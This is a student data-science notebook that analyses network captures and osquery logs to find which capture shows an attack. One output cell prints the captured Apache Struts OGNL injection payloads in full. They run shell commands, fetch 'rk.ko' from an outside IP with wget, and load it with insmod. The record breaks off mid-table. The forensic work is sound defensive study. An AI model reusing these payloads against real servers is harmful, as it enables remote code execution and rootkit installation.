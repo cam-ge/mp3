{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ECE 498 DS Mini Project 3\n",
    "avk2@illinois.edu \n",
    "\n",
    "zinan2@illinois.edu\n",
    "\n",
    "jg8@illinois.edu"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Task 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Process pcap files into Pandas Dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "import pyshark\n",
    "import json\n",
    "import math\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "dns = pyshark.FileCapture('./data/dns.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('./data/http.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "http2 = pyshark.FileCapture('./data/http2.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: nest_asyncio in /Users/zinan/.pyenv/versions/3.7.2/lib/python3.7/site-packages (1.3.2)\n",
      "\u001b[33mYou are using pip version 18.1, however version 20.1 is available.\n",
      "You should consider upgrading via the 'pip install --upgrade pip' command.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!pip install nest_asyncio"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import nest_asyncio\n",
    "nest_asyncio.apply()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### dns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'22'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns[0].tcp.port"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "dns_data = []\n",
    "for pkt in dns:\n",
    "    try:\n",
    "        d = {\n",
    "            'sniff_time': pkt.sniff_time,\n",
    "            'length': pkt.length,\n",
    "            'highest_layer': pkt.highest_layer,\n",
    "            'time_stamp': pkt.sniff_timestamp,\n",
    "            'ip': pkt.ip,\n",
    "            'ip_src': pkt.ip.src,\n",
    "            'ip_dst': pkt.ip.dst,\n",
    "            'port': pkt.udp.srcport\n",
    "        }\n",
    "        dns_data.append(d)\n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_dns = pd.DataFrame(dns_data, columns = ['sniff_time', 'length', 'highest_layer', 'time_stamp', 'ip', 'ip_src', 'ip_dst', 'port'])\n",
    "df_dns.to_csv(\"dns_df.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### http"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "http_data = []\n",
    "\n",
    "for pkt in http:\n",
    "    for i in range(len(pkt.layers)):\n",
    "        if pkt[i].layer_name == 'http':        \n",
    "            try:\n",
    "                d = {\n",
    "                    'sniff_time': pkt.sniff_time,\n",
    "                    'length': pkt.length,\n",
    "                    'highest_layer': pkt.highest_layer,\n",
    "                    'time_stamp': pkt.sniff_timestamp,\n",
    "                    'ip': pkt.ip.dst,\n",
    "                    'port': pkt.tcp.port,\n",
    "                    'content_type': pkt.http.content_type\n",
    "                }\n",
    "            except AttributeError:\n",
    "                pass\n",
    "            \n",
    "    http_data.append(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_http = pd.DataFrame(http_data, columns = ['sniff_time', 'length', 'highest_layer', 'time_stamp', 'ip', 'port', 'content_type'])\n",
    "df_http.to_csv(\"http_df.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### http2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "http2_data = []\n",
    "\n",
    "for pkt in http2:\n",
    "    for i in range(len(pkt.layers)):\n",
    "        if pkt[i].layer_name == 'http':        \n",
    "            try:\n",
    "                d = {\n",
    "                    'sniff_time': pkt.sniff_time,\n",
    "                    'length': pkt.length,\n",
    "                    'highest_layer': pkt.highest_layer,\n",
    "                    'time_stamp': pkt.sniff_timestamp,\n",
    "                    'ip': pkt.ip.dst,\n",
    "                    'port': pkt.tcp.port,\n",
    "                    'content_type': pkt.http.content_type\n",
    "                }\n",
    "            except AttributeError:\n",
    "                pass\n",
    "            \n",
    "    http2_data.append(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_http2 = pd.DataFrame(http2_data, columns = ['sniff_time', 'length', 'highest_layer', 'time_stamp', 'ip', 'port', 'content_type'])\n",
    "df_http2.to_csv(\"http2_df.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Process Operating System Query logs into Pandas Dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "log_list = []\n",
    "with open(\"./data/osqueryd.results.log\", \"r\") as log_data:\n",
    "    for line in log_data:\n",
    "        log_list.append(eval(line))\n",
    "df_log = pd.json_normalize(log_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_log.to_csv(\"oslogs.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Which one is attacker"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if '#cmd' in content_type:\n",
    "            http_cmd += 1\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "http2_cmd = 0\n",
    "\n",
    "for pck in http2:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if '#cmd' in content_type:\n",
    "            http2_cmd += 1\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#cmd in http content-type is 7, #cmd in http2 content-type is 0\n"
     ]
    }
   ],
   "source": [
    "print(f'#cmd in http content-type is {http_cmd}, #cmd in http2 content-type is {http2_cmd}')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The http pcap file represents attacker activity.  It contains HTTP layers that have #cmd strings in their content type.  The legitimate http2 file has no such HTTP layers and no evidence of #cmd strings."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### HTTP Traffic Analysis "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_data = []\n",
    "for pkt in http:\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'tcp':\n",
    "        continue\n",
    "    \n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'dest_ip': pkt.ip.dst,\n",
    "        'dest_port': pkt.tcp.dstport\n",
    "    }\n",
    "    df_data.append(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.DataFrame(df_data)\n",
    "df.to_csv(\"http_df.csv\", sep='\\t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['172.17.0.2', '10.0.2.2', '172.17.0.1', '162.212.156.148'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['dest_ip'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "      timestamp     dest_ip dest_port\n",
      "0  1.521395e+09  172.17.0.2      8080\n",
      "1  1.521395e+09    10.0.2.2     55952\n",
      "2  1.521395e+09  172.17.0.2      8080\n",
      "3  1.521395e+09  172.17.0.2      8080\n",
      "4  1.521395e+09    10.0.2.2     55952\n",
      "600\n"
     ]
    }
   ],
   "source": [
    "print(df.head())\n",
    "print(len(df))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As shown the UNIX timestamp of the first attempt is 1.521395e+09 While its address is 172.17.0.2 and destination port is 8080"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "nan\n",
      "text/html;charset=ISO-8859-1\n",
      "text/javascript\n",
      "text/html\n",
      "text/css\n",
      "image/png\n",
      "text/html;charset=UTF-8\n",
      ".multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}\n",
      "application/x-www-form-urlencoded\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "content_headers=df_http.content_type.unique()\n",
    "content_headers\n",
    "num=[]\n",
    "for i in range (len(content_headers)):\n",
    "    print(content_headers[i])\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "28\n",
      "15\n",
      "9\n",
      "8\n",
      "9\n",
      "23\n",
      "144\n",
      "33\n",
      "806\n",
      "810\n",
      "845\n",
      "818\n"
     ]
    }
   ],
   "source": [
    "content_headers=df_http.content_type.unique()\n",
    "content_headers\n",
    "num=[]\n",
    "\n",
    "for i in range (len(content_headers)):\n",
    "    if not isinstance(content_headers[i], float):\n",
    "        print(len(content_headers[i]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Host Logs Analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "oslog = pd.read_csv('oslogs.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>644.0</td>\n",
       "      <td>1.517877e+09</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096.0</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swp</td>\n",
       "      <td>1.517877e+09</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1.517877e+09</td>\n",
       "      <td>0.0</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1.517877e+09</td>\n",
       "      <td>0.0</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1.517877e+09</td>\n",
       "      <td>0.0</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime  epoch  counter action                 decorations.host_uuid  \\\n",
       "0  1517877185      0    38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                               NaN   \n",
       "3                 root          NaN  ...                               NaN   \n",
       "4                 root          NaN  ...                               NaN   \n",
       "\n",
       "   columns.mode columns.mtime                              columns.sha1  \\\n",
       "0           NaN           NaN                                       NaN   \n",
       "1         644.0  1.517877e+09  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2           NaN           NaN                                       NaN   \n",
       "3           NaN           NaN                                       NaN   \n",
       "4           NaN           NaN                                       NaN   \n",
       "\n",
       "                                      columns.sha256  columns.size  \\\n",
       "0                                                NaN           NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...        4096.0   \n",
       "2                                                NaN           NaN   \n",
       "3                                                NaN           NaN   \n",
       "4                                                NaN           NaN   \n",
       "\n",
       "                 columns.target_path  columns.time  columns.transaction_id  \\\n",
       "0                                NaN           NaN                     NaN   \n",
       "1  \\/etc\\/osquery\\/.osquery.conf.swp  1.517877e+09                     0.0   \n",
       "2  \\/etc\\/osquery\\/.osquery.conf.swx  1.517877e+09                     0.0   \n",
       "3  \\/etc\\/osquery\\/.osquery.conf.swx  1.517877e+09                     0.0   \n",
       "4  \\/etc\\/osquery\\/.osquery.conf.swx  1.517877e+09                     0.0   \n",
       "\n",
       "   columns.uid  \n",
       "0          NaN  \n",
       "1          0.0  \n",
       "2          NaN  \n",
       "3          NaN  \n",
       "4          NaN  \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslog.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "oslog_kernel = oslog[oslog.name == 'kernel_module']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>ipt_MASQUERADE</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>44</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>nf_nat_masquerade_ipv4</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>nf_conntrack_netlink</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>nfnetlink</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "             name hostIdentifier                  calendarTime    unixTime  \\\n",
       "42  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "43  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "44  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "45  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
